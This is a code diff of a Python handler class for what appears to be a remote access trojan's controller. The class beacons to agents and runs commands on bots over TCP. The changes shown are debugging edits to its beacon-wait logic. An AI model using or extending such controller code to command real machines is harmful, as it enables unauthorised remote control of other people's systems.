@@ -103,9 +103,11 @@ class Handler(threading.Thread):
         self.status[1] = beacon_status
 
     def stopBeacon(self):
+        #print("=Stopping Beacon=")
         self.beacon_wait = True
 
     def startBeacon(self):
+        #print("=Starting Beacon=")
         self.beacon_wait = False
 
     def setOS(self):
@@ -210,6 +212,8 @@ class Handler(threading.Thread):
 
             # Check RAT-STATUS
             if not self.beacon_wait:            # If not in mode that could jumble up the output to and from the agent with the beacons, because if we're in that mode then we know its beaconing already
+
+                print("beacon_wait: "+str(self.beacon_wait))
                 if self.transport_type == "TCP":
                     try:
                         msg = self.execute("beacon-probe", True)
@@ -380,7 +384,7 @@ class Handler(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
     def execute(self, cmd_sent, suppress=True):
 
-        self.beacon_wait = True
+        #self.beacon_wait = True
         if not suppress:
             # Log this
             print(f"[* BotHandler-Msg:StdExec] Received Command: {str(cmd_sent)} for bot {str(self.agent_id)}")
@@ -444,7 +448,7 @@ class Handler(threading.Thread):
                 else:
                     cmd_response += recv
 
-            self.beacon_wait = False
+            # self.beacon_wait = False
             return str(cmd_response)
 #------------------------------------------------------------------------------------------------------------------------------
 
